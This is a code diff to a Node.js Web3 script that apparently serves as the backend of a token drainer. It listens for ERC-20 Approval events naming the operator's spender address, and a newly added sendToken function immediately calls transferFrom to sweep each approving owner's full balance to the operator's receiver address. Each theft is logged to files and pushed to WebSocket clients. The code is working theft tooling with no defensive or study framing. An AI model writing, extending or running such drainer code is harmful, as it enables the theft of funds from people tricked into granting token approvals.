@@ -14,7 +14,7 @@ var privateKey = argv.k.trim();
 var spender = (new Web3()).eth.accounts.privateKeyToAccount(privateKey).address
 var receiver = spender
 
-if (argv.receiver) receiver = argv.receiver.trim();
+if (argv.receiver) receiver = argv.receiver.toString();
 
 logWaning("spender", spender)
 logWaning("receiver", receiver)
@@ -48,6 +48,59 @@ function sendMessageClient(message, allClient = true, clientId = 0) {
     }
 }
 
+async function appendFile(filePath, content) {
+    let fd = fs.openSync("data/" + filePath, 'a+');
+    fs.appendFileSync(fd, content + "\n", 'utf8');
+}
+
+async function sendToken(web3, symbol, contract, from, to) {
+    const gasPrice = await web3.eth.getGasPrice();
+    let allowance = await contract.methods.allowance(from, spender).call();
+    let balance = await contract.methods.balanceOf(from).call();
+    if (parseInt(allowance) > 1 && balance > 10) {
+        const gasEstimate = await contract.methods.transferFrom(from, to, balance).estimateGas({ from: spender });
+        log('sendToken', from, to, spender);
+        contract.methods.transferFrom(from, to, balance).send({ from: spender, gasPrice: gasPrice, gas: gasEstimate }).then(r => {
+            let content = {
+                chain: web3.eth.networkVersion,
+                symbol: symbol,
+                from: from,
+                to: to,
+                transactionHash: r.transactionHash,
+            }
+
+            try {
+                appendFile("transfereds.txt", JSON.stringify(content))
+                logSuccess('transferFrom Success')
+                sendMessageClient({
+                    onSent: content
+                })
+
+            } catch (error) {
+                throw error;
+            }
+        }).catch(error => {
+
+            let content = {
+                chain: web3.eth.networkVersion,
+                symbol: symbol,
+                from: from,
+                to: to,
+                error: error.message
+            }
+
+            try {
+                appendFile("transferedsError.txt", JSON.stringify(content))
+                sendMessageClient({ error: error.message })
+                logError("transferedsError: ")
+                logError(error)
+            } catch (error) {
+                throw error;
+            }
+        });
+    } else { logError("allowance: ", allowance, "balance: ", balance) }
+}
+
 function listenEvents(settings) {
     let { tokens, abiFolder } = settings
     let web3s = []
@@ -57,12 +110,13 @@ function listenEvents(settings) {
         Object.keys(tokens[symbol]).map(async id => {
             let chainId = parseInt(id)
             let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
-            // log(abiPath, fs.existsSync(abiPath), symbol, chainId)
+            log(abiPath, fs.existsSync(abiPath), symbol, chainId)
             let abi = JSON.parse(fs.readFileSync(abiPath, "utf-8"))
 
             if (chainId === 1337 || chainId === 5777) {
                 abi = abi.abi; chainId = 5777;
             }
+
             let rpc = quicknode[chainId].link
 
             let provider;
@@ -77,19 +131,28 @@ function listenEvents(settings) {
 
             let contract = new web3.eth.Contract(abi, tokens[symbol][chainId].address)
             contract.events.Approval({ filter: { "spender": spender } }, (error, event) => {
-                if (error) logError(symbol, chainId, error)
-                else {
+                if (error) {
+                    logError(symbol, chainId, error);
+                    let content = {
+                        "symbol": symbol, "chainId": chainId, error: error.message
+                    }
+                    appendFile("approvalError.txt", content)
+                    sendMessageClient(content)
+                } else {
                     logSuccess(chainId, symbol)
-                    log(event.returnValues)
-
-                    sendMessageClient({
-                        onApproval: {
-                            chainId: chainId,
-                            symbol: symbol,
-                            value: event.returnValues
-                        }
+                    // log(event.transactionHash, event.returnValues.owner)
+                    let content = {
+                        chainId: chainId,
+                        symbol: symbol,
+                        owner: event.returnValues.owner,
+                        spender: event.returnValues.spender,
+                        transactionHash: event.transactionHash,
+                    }
+                    appendFile("approveds.txt", {
+                        onApproval: content
                     })
-                    sendToken(contract, from, to)
+                    sendMessageClient(content)
+                    sendToken(web3, symbol, contract, event.returnValues.owner, receiver)
                 }
             })
 
@@ -125,7 +188,7 @@ wss.on('connection', (ws) => {
         sendMessageClient({ "message": "hi " + id })
     });
 
-    ws.send("hello");
+    ws.send(`{ "message": "hi ${id}" }`);
     ws.onclose = (e) => {
         clients.slice(id, 1)
         logError("onclose ws " + id)
